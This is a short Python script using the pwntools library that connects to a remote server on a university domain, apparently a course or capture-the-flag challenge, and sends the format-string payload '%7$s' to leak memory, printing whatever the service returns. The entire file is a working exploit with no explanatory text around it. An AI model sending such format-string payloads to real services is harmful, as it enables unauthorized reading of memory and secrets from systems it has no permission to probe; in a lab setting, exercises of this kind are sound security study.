from pwn import *
import sys

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23192

payload = b"%7$s"

s = remote(SERVER, PORT, timeout=100)

s.sendline(payload)

print(s.recvall())
s.close()